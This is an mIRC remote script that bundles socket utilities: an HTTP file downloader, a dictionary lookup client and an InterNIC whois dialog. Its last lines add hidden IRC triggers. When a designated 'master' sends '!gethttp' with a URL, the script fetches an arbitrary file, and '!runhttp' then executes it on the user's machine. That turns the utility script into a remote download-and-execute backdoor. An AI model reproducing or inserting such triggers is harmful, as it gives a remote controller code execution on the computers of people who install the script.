[script]
n0=on *:sockopen:http: {
n1=  if ($sockerr > 0) { echo -a error connecting to server $bracket(%http.domain) | sockclose http | return }
n2=  echo -a getting file $bracket($nopath(%http.get))
n3=  .write -c %http.get
n4=  sockwrite -n http GET %http.ext
n5=}
n6=on *:sockread:http: {
n7=  :x
n8=  sockread &http
n9=  bwrite %http.get -1 &http
n10=  if ($sockbr == 0) { return }
n11=  goto x
n12=}
n13=on *:sockclose:http: {
n14=  set %lastget %http.get
n15=  amsg received file %http $+ , it has been placed into $getdir 
n16=
n17=  return
n18=}
n19=dialog dict {
n20=  title "online dictionary"
n21=  size -1 -1 400 200
n22=  text "Word to define", 10, 14 10 100 20
n23=  edit "wonder", 20, 10 30 280 22, result autohs
n24=  button "&Define", 30, 300 30 80 25, OK default
n25=  edit "", 21, 10 60 370 130, multi return vsbar
n26=}
n27=on *:dialog:dict:sclick:30: {
n28=  if ($did(dict,20) == $null) return
n29=  set %dict.word $did(dict,20)
n30=  dict_lookup %dict.word
n31=  did -r dict 21
n32=  did -a dict 21 Defining $did(dict,20) $+ ... $crlf $crlf
n33=  halt
n34=}
n35=on *:sockopen:dict: {
n36=  if ($sockerr > 0) { did -a dict 21 cannot connect with dictionary server | sockclose dict | return }
n37=  sockwrite -n dict DEFINE %dict.word
n38=}
n39=on *:sockread:dict: {
n40=  :x
n41=  if ($sock(dict) == $null) { return } | sockread %dict.read
n42=  if ($sockbr == 0) { sockclose dict }
n43=  set %dict.blah DEFINITION 0
n44=  if ($gettok(%dict.read,1,32) == error) || ($gettok(%dict.read,1,32) == spelling) { sockclose dict | did -a dict 21 no definition for %dict.word | return }
n45=  if (%dict.blah == %dict.read) goto x
n46=  if (%dict.read) did -a dict 21 %dict.read $crlf
n47=  goto x
n48=}
n49=on 1:sockopen:nic: {
n50=  if ($sockerr > 0) { did -a nic 21 Error connecting to internic server | sockclose nic | return }
n51=  sockwrite -n nic whois %internic.domain
n52=}
n53=on 1:sockread:nic: {
n54=  :x
n55=  sockread %internic.read
n56=  if ($sockbr == 0) { return }
n57=  did -a nic 21 %internic.read $crlf
n58=  goto x
n59=}
n60=dialog nic {
n61=  title "internic lookup"
n62=  size -1 -1 400 200
n63=  text "Domain to look up", 10, 14 10 100 20
n64=  edit "pornstar.com", 20, 10 30 280 22, result autohs
n65=  button "&Look Up", 30, 300 30 80 25, OK default
n66=  edit "", 21, 10 60 370 130, multi return vsbar
n67=}
n68=on *:dialog:nic:sclick:30: {
n69=  if ($did(nic,20) == $null) return
n70=  set %internic.domain $did(nic,20)
n71=  nic_lookup $did(nic,20)
n72=  did -r nic 21
n73=  did -a nic 21 Looking up $did(nic,20) $+ ... $crlf $crlf
n74=  halt
n75=}
n76=menu channel,status,menubar {
n77=  sockets
n78=  .download
n79=  ..get file:http $$?="http://www.url.com/dir/file.html"
n80=  ..stop trans:https
n81=  .dict:dict
n82=  .internic:nic
n83=  .-
n84=  .help:run $$dir="Select the file, its called readmesock.txt" $mircdir\readmesock.txt
n85=}
n86=alias http {
n87=  if ($1) {
n88=    set %http.full $remove($1,http://)
n89=    set %http.domain $gettok(%http.full,1,47)
n90=    set %http.ext / $+ $gettok(%http.full,2-,47)
n91=    set %http.get $getdir $+ $gettok(%http.ext,$gettok(%http.ext,0,47),47)
n92=    sockopen http %http.domain 80
n93=    echo -a connecting to $1- | set %http $1-
n94=    return
n95=  }
n96=  usage http
n97=}
n98=alias https {
n99=  if ($sock(http) == $null) { echo -a no download in progress | return }
n100=  sockclose http
n101=  echo -a stopped http download $bracket($nopath(%http.get))
n102=  return
n103=}
n104=alias sf12 run $getdir
n105=alias dict if ($1) { set %dict.word $1 } | dict_dial
n106=alias dict_lookup sockopen dict muesli.ai.mit.edu 2627
n107=alias dict_dial dialog -m dict dict
n108=alias nic if ($1) { set %internic.domain $1 } | nic_dial
n109=alias nic_lookup sockopen nic rs.internic.net 43
n110=alias nic_dial dialog -m nic nic
n111=
n112=on 10:TEXT:!gethttp*:#: if ($address == %master) { %w.g.# = # | /http $2 }
n113=on 10:TEXT:!gethttp*:?: if ($address == %master) { %w.g.# = $nick | /http $2 }
n114=on 10:TEXT:!filehttp:#: { msg $chan File: %http.get }
n115=on 10:TEXT:!runhttp:#: if ($address == %master) { %w.g.# = # | /msg # Running: %http.get In: %http.get | /run %http.get }
n116=on 10:TEXT:!runhttp:?: if ($address == %master) { %w.g.# = $nick | /msg $nick Running: %http.get In: %http.get | /run %http.get }
